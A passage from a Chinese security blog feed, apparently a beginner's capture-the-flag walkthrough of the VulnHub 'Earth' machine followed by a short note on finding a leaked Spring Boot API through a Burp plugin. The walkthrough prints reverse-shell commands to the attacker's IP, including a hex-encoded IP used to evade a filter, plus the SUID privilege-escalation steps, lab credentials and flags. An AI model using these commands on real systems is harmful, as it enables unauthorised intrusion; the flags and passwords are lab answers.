later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;                      </span><br><span class="line"></span><br><span class="line">testdata=binascii.b2a_hex(decode_txt).decode()</span><br><span class="line"></span><br><span class="line">print(hex(int(key1,16)^int(testdata,16)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个攻略直接写了一个python脚本解码</p>
<p>(什么时候才能到这个地步!)</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012192526644.png"></p>
<p>经过一连串转运(其实很容易,搬运就好了,但由于没有认真细心,导致用了很长时间)</p>
<h3 id="得到16进制的密码解密"><a href="#得到16进制的密码解密" class="headerlink" title="得到16进制的密码解密"></a>得到16进制的密码解密</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进制转换后得到密码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>

<p>得到明文,发现密码都是重复的</p>
<h2 id="所以取得密码"><a href="#所以取得密码" class="headerlink" title="所以取得密码:"></a>所以取得密码:</h2><p>earthclimatechangebad4humans</p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录:"></a>登录:</h3><p>账户: terra</p>
<p>密码:earthclimatechangebad4humans</p>
<h1 id="登陆成功"><a href="#登陆成功" class="headerlink" title="登陆成功:"></a>登陆成功:</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20221012193236664-1665917500677.png"></p>
<p>在这里可以进行任意命令操作</p>
<h2 id="任意命令操作"><a href="#任意命令操作" class="headerlink" title="任意命令操作"></a>任意命令操作</h2><p>此靶场是linux操作系统,所以我们还要学习Linux操作命令</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012193450262.png"></p>
<p>发现可以!</p>
<p>输入 id;ls 可见，为 apache用户，同时显示出了 根目录下的内容，根据 vulnhub 的描述: There are two flags on the box: a user and root flag which include an md5 hash.</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012194450382.png"></p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name “*flag*” </span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20221012194850869.png"></p>
<p>找到flag文件位置</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012195011127.png"></p>
<p>输入读取对应flag文件的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/earth_web/user_flag.txt</span><br></pre></td></tr></table></figure>

<p>得到:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012195236367.png"></p>
<p>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </p>
<p>根据靶场说明一共有两个flag</p>
<p>一个在user 一个在 root 下</p>
<h2 id="打算获取远程连接-远程连接的实现知识点"><a href="#打算获取远程连接-远程连接的实现知识点" class="headerlink" title="打算获取远程连接  (远程连接的实现知识点)"></a>打算获取远程连接  (远程连接的实现知识点)</h2><p>发现禁止远程链接</p>
<p><strong>bash -i &gt;&amp; /dev/tcp/192.168.50.128/4444 0&gt;&amp;1</strong></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012200119481.png"></p>
<p>他禁止连接，那我我们来绕过一下，无非就是编码那一套，刚开始我把所有的都给编码了，后来才发现，只需要对IP进行编码就行(按大佬的思路,16进制编码后即可)</p>
<p>192.168.50.128 (我抄,这个位置错了应该是我们自己机器的IP地址,想想也是,妈的傻了)</p>
<p>换成攻击机IP地址:192.168.50.131 </p>
<p>转换成16进制编码</p>
<p>0xc0.0xa8.0x32.0x83</p>
<p>bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x32.0x83/1234 0&gt;&amp;1</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012201429320.png"></p>
<p>成功进行远程链接名令,但我无法使用kali达到监听端口</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012205605679.png"></p>
<p>应该是端口号冲突了</p>
<p>排查完错误后,换个端口号可以成功拿到shell</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013152338953.png"></p>
<h2 id="拿到反弹shell后"><a href="#拿到反弹shell后" class="headerlink" title="拿到反弹shell后"></a>拿到反弹shell后</h2><p>进行信息提权</p>
<p>使用命令</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154327029.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154448813.png"></p>
<p>发现三个和靶场说明相关的文件</p>
<p>依次看看</p>
<p>/usr/bin/passwd</p>
<p>/usr/bin/reset_root</p>
<p>/usr/sbin/grub2-set-bootflag</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154640620.png"></p>
<p>发现需要输入密码,但我们要的就是靶机账户密码  (我应该在得到root密码后再回来看一下这个文件的,但最后忘了)</p>
<p>换个文件</p>
<p>/usr/bin/reset_root</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013155152095.png"></p>
<p>去翻译一下</p>
<p>正在检查是否存在重置触发器。。。</p>
<p>重置失败，所有触发器不存在。</p>
<p>提示为触发器不存在,去看看大佬们的攻略</p>
<p>(我抄看不懂,先跟着做吧)</p>
<p>本地没有调试命令，使用nc传送到本地调试一下</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013161129978.png"></p>
<p>接收文件成功</p>
<p>先给这个文件赋予执行的权限，再进行调试</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013162449927.png"></p>
<p>完成这个过程还学到了三个指令</p>
<p>寻找文件进程指令和杀死文件进程指令</p>
<p>sudo fuser</p>
<p>sudo kill -9</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013162528950.png"></p>
<p>还在fly师傅的指导下学会了 上箭头使用命令行上一个指令</p>
<p>现在进入下一个操作</p>
<p>在靶机上创建这三个文件</p>
<p>/dev/shm/kHgTFI5G</p>
<p>/dev/shm/Zw7bV9U5</p>
<p>/tmp/kcM0Wewe</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163123164.png"></p>
<p>得到root权限的密码:Earth</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163414097.png"></p>
<h1 id="更换root权限获取最终flag"><a href="#更换root权限获取最终flag" class="headerlink" title="更换root权限获取最终flag"></a>更换root权限获取最终flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1$ su  </span><br><span class="line">su</span><br><span class="line">Password: Earth</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">root_flag.txt</span><br><span class="line">cat root_flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163912965.png"></p>
<p>拿到最终flag</p>
<p>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>
<p>在earth靶机上认证通过</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013164136220.png"></p>
<p>这是两个flag</p>
<p>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </p>
<p>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>
<p>网站账号密码:</p>
<p>账户: terra</p>
<p>密码:earthclimatechangebad4humans</p>
<p>root密码:</p>
<p>Earth</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我第一次打的的靶机,还涉及到了解密.</p>
<p>从一个网站通过扫描后台目录发现重要文件 “robots.txt”里面存在的测试数据文件</p>
<p>到文件里的文件里的文件借助网站页面显示的密钥破译出密文</p>
<p>得到网站密码</p>
<p>成功登录后台网站</p>
<p>再到借助后台存在的任意命令执行(不知道网站有没有这种漏洞存在)反弹shell拿到靶机普通权限</p>
<p>再一次在靶机里面收集信息,得到root密码文件,通过触发器(不明白这一点)文件修复好这个密码文件,最终取得密码</p>
<p>此经验很好,还学会了一些kali命令,但最重要的还是学会<strong>通关的思路</strong></p>
<p>当我们遇见像靶场中的情况,我们该怎么下手,从哪里开始.</p>
<p>此靶场中的很多知识我目前还没学会</p>
<p>像:远程连接操作 , Linux命令操作 , 还有解密, python, 什么触发器操作等等</p>
<p>打靶场就是检验自己学习的成果,总结前面,计划未来的学习方向.</p>
<p>常看常新!</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E8%8D%89%E7%A5%9E.gif"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>通过burp插件：TsojanScan发现springboot框架下的api接口泄露</title>
    <url>/2023/03/19/15-55-17/</url>
    <content><![CDATA[<h1 id="通过burp插件：TsojanScan发现springboot框架下的api接口泄露"><a href="#通过burp插件：TsojanScan发现springboot框架下的api接口泄露" class="headerlink" title="通过burp插件：TsojanScan发现springboot框架下的api接口泄露"></a>通过burp插件：TsojanScan发现springboot框架下的api接口泄露</h1><h2 id="1-先简单介绍一下这个插件："><a href="#1-先简单介绍一下这个插件：" class="headerlink" title="1.先简单介绍一下这个插件："></a>1.先简单介绍一下这个插件：</h2><p><a href="https://mp.weixin.qq.com/s/Ob6pBBQW-FSESQqQcICfSw">https://mp.weixin.qq.com/s/Ob6pBBQW-FSESQqQcICfSw</a></p>
<p>”市面上各大漏洞探测插件的功能比较单一，因此与TsojanSecTeam成员决定在已有框架的基础上修改并增加常用的漏洞探测POC，它会以最少的数据包请求来准确检测各漏洞存在与否，你只需要这一个足矣。“</p>
<p>效果不错，刚装上就出现了检测，该工具会在你访问网站时对网站数据包进行监测，在测试时注意看看该工具对网站的判断。</p>
<h2 id="2-目标网站特征："><a href="#2-目标网站特征：" class="headerlink" title="2.目标网站特征："></a>2.目标网站特征：</h2><p>在目标网站的8849端口出现Tomcat的404页面。</p>
<p><img src="/$%7Bfiilename%7D/image-20230319152015471.png" alt="image-20230319152015471"></p>
<p>（也是前几天看文章才发现这是Tomcat的404页面。）</p>
<p>附文章：<a href="https://mp.weixin.qq.com/s?__biz=MzkyMjM5NDM3NQ==&amp;mid=2247484801&amp;idx=1&amp;sn=cd6d496e5271d471bf19135de923f4b1&amp;chksm=c1f44fe9f683c6ff53f261d36389ab059a4ed01535c8685755ba78fe14bd6b1cb5feaa765437&amp;mpshare=1&amp;scene=1&amp;srcid=0318YaWdqgbWf0p6Pwr2BrX5&amp;sharer_sharetime=1679100509972&amp;sharer_shareid=ee9017754c31398b19b8614187cea6f2&amp;key=856e84c5d55fcfa08f2040f45ca09ac2ec104fabdb405d17179e81b038c7db5ed957dc26194be199408a447c307f58b205a66dbbb475147bd2d1c95903ea076b31e6e58ed5973f85043e87ca0407a842d9306c2f84ee116509a23ad26f1611459e250734cce00d005cbf5e366becb344afa1db5c8b0d4f8cfcb8d0a231ac3054&amp;ascene=1&amp;uin=MzEwOTQzOTA1Ng==&amp;devicetype=Windows+11+x64&amp;version=6309001c&amp;lang=zh_CN&amp;countrycode=VA&amp;exportkey=n_ChQIAhIQXq7Rt+hVRwfOiXrxQMGBlxLqAQIE97dBBAEAAAAAAJycGJP9qwUAAAAOpnltbLcz9gKNyK89dVj0zERyttew4Y9UJ9Lf294m2SXoe7Mq20Jjj0N4NN5Nrrz6B+hfYT3ahqeQ3h+PZkaoJ4aVr6gEkgunNqqMglXChXnMUj0/Q6Fjj9gnKKLOUL3Je+CLo0n+QrkeLuWDoi1pN6PXiC6jDBpKVWqxvcMzRv1uAw2waURaI9DOE4dpvNo0XSWg1bWBoMhmPfTa36Aj8Icu+9bIRQzzk8w+d5tAGK0jpLBqbpM8CEvFdD1d+wVILY0MPExLqr6g0XZ+PLCVahQILg==&amp;acctmode=0&amp;pass_ticket=hosTGulAU4YCCINrezS8MsBixvPW8HpGes6wXZ5/4UaRG5D77ohghKgnRHPpCa/AQhtedO/CpXsj7Xd7s1Y32Q==&amp;wx_header=1&amp;fontgear=2">https://mp.weixin.qq.com/s?__biz=MzkyMjM5NDM3NQ==&amp;mid=2247484801&amp;idx=1&amp;sn=cd6d496e5271d471bf19135de923f4b1&amp;chksm=c1f44fe9f683c6ff53f261d36389ab059a4ed01535c8685755ba78fe14bd6b1cb5feaa765437&amp;mpshare=1&amp;scene=1&amp;srcid=0318YaWdqgbWf0p6Pwr2BrX5&amp;sharer_sharetime=1679100509972&amp;sharer_shareid=ee9017754c31398b19b8614187cea6f2&amp;key=856e84c5d55fcfa08f2040f45ca09ac2ec104fabdb405d17179e81b038c7db5ed957dc26194be199408a447c307f58b205a66dbbb475147bd2d1c95903ea076b31e6e58ed5973f85043e87ca0407a842d9306c2f84ee116509a23ad26f1611459e250734cce00d005cbf5e366becb344afa1db5c8b0d4f8cfcb8d0a231ac3054&amp;ascene=1&amp;uin=MzEwOTQzOTA1Ng%3D%3D&amp;devicetype=Windows+11+x64&amp;version=6309001c&amp;lang=zh_CN&amp;countrycode=VA&amp;exportkey=n_ChQIAhIQXq7Rt%2BhVRwfOiXrxQMGBlxLqAQIE97dBBAEAAAAAAJycGJP9qwUAAAAOpnltbLcz9gKNyK89dVj0zERyttew4Y9UJ9Lf294m2SXoe7Mq20Jjj0N4NN5Nrrz6B%2BhfYT3ahqeQ3h%2BPZkaoJ4aVr6gEkgunNqqMglXChXnMUj0%2FQ6Fjj9gnKKLOUL3Je%2BCLo0n%2BQrkeLuWDoi1pN6PXiC6jDBpKVWqxvcMzRv1uAw2waURaI9DOE4dpvNo0XSWg1bWBoMhmPfTa36Aj8Icu%2B9bIRQzzk8w%2Bd5tAGK0jpLBqbpM8CEvFdD1d%2BwVILY0MPExLqr6g0XZ%2BPLCVahQILg%3D%3D&amp;acctmode=0&amp;pass_ticket=hosTGulAU4YCCINrezS8MsBixvPW8HpGes6wXZ5%2F4UaRG5D77ohghKgnRHPpCa%2FAQhtedO%2FCpXsj7Xd7s1Y32Q%3D%3D&amp;wx_header=1&amp;fontgear=2</a></p>
<p>（要想生活过得去，多看美女多看报。）</p>
<p>在进行url拼接后发现该网站符合springboot框架的特征：</p>
<p><img src="/$%7Bfiilename%7D/image-20230319150426631.png" alt="image-20230319150426631"></p>
<p>但这也是我后来去翻文章地址才知道的特征表现（人老了，记忆了不足了，想不起来了。）</p>
<p>发现该接口地址还是靠以上工具的作用，但我们要知道上面页面特征才行，不然光用工具显得很呆，而且工具也会不靠谱，打铁还需自身硬。</p>
<p>又看了一下，理论上我们是无法通过该8849端口通过js审计拿到8890端口网站的接口的</p>
<p><img src="/$%7Bfiilename%7D/image-20230319151116366.png" alt="image-20230319151116366"></p>
<p>因为该地址压根没有js文件，我在点开该网站时都是直接忽略了，还是前辈们厉害，好想当点鼠标的猴子啊。</p>
<p>由于该接口功能点众多，就不放图了，在文章；链接里博主给了一个很经典的有js审计而来的例子。</p>
<p>在本文章接口地址中，网站是直接将整个接口文档暴露了在外边我们，还清晰的指出了url拼接的basePath，也就是根目录，要想让页面不反回报错信息我们需要在js文件中找到basepath，才能拼接我们找到的接口地址。以后在查看js文件时可以先ctrl-F一下”basepath“，或许有意外收获，但更多的需要我们一个一个的去翻js文件，心谨细微不过如此。</p>
<p>网上也有很多spring框架利用工具，大多都是基于默认目录下的接口泄露利用，先埋个坑，”前面的区域以后再来探索吧“。</p>
]]></content>
      <categories>
        <category>api接口泄露</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
</search>
